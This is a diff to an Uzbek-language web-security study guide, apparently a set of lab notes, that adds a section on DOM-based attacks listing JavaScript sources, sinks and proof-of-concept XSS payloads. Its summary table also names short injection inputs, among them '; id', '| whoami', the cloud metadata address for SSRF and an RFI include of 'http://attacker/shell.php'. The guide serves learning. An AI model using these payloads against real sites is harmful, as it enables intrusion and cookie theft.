@@ -20,6 +20,7 @@
 | 09 | ⚡ Command Injection | OS buyruqlari, blind, reverse shell | [09_command_injection.md](09_command_injection.md) |
 | 10 | 🗄️ SQL Injection | UNION, Blind, sqlmap, schema | [10_sql_injection.md](10_sql_injection.md) |
 | 11 | 🏁 Race Conditions | TOCTOU, parallel so'rovlar, threading | [11_race_conditions.md](11_race_conditions.md) |
+| 12 | 🌐 DOM-Based Attacks | Source, Sink, DOM XSS, Clobbering, Redirect | [12_dom_based_attacks.md](12_dom_based_attacks.md) |
 
 ---
 
@@ -119,6 +120,31 @@ threads = [threading.Thread(target=lambda: requests.post(url, data=data)) for _ 
 [t.start() for t in threads]; [t.join() for t in threads]
 ```
 
+### 🌐 DOM-Based Attacks
+```javascript
+// Source lar (tekshirish kerak):
+location.search    // ?dan keyingi qism
+location.hash      // #dan keyingi qism
+document.referrer
+
+// Sink lar (xavfli funksiyalar):
+element.innerHTML = SOURCE
+eval(SOURCE)
+location.href = SOURCE
+document.write(SOURCE)
+
+// DOM XSS payloadlari:
+// innerHTML sink uchun:
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+// eval() sink uchun:
+alert(document.cookie)
+
+// Open Redirect sink uchun:
+javascript:alert(1)
+```
+
 ---
 
 ## 🧠 Zaifliklarni Eslab Qolish Uchun Jadval
@@ -133,9 +159,10 @@ threads = [threading.Thread(target=lambda: requests.post(url, data=data)) for _ 
 | **RFI** | `?page=` parametr | `http://attacker/shell.php` |
 | **SSRF** | `?url=` parametr | `127.0.0.1`, `169.254.169.254` |
 | **XSS** | Matn chiqaruvchi joy | `<script>`, `onerror=` |
-| **Cmd Injection** | Tizim buyrug'i | `; id`, `| whoami` |
+| **Cmd Injection** | Tizim buyrug'i | `; id`, `\| whoami` |
 | **SQLi** | SQL so'rov | `'`, `UNION SELECT`, sqlmap |
 | **Race Condition** | Bir martalik limit | Parallel so'rovlar, threading |
+| **DOM-Based** | JS Source → Sink | `innerHTML`, `eval()`, `location.hash` |
 
 ---
 
@@ -173,6 +200,7 @@ threads = [threading.Thread(target=lambda: requests.post(url, data=data)) for _ 
 10. SQL Injection            → Bazani o'qish
         ↓
 11. Race Conditions          → Vaqt zaifliklaridan foydalanish
+12. DOM-Based Attacks        → Brauzer DOM ni manipulyatsiya qilish
 ```
 
 ---
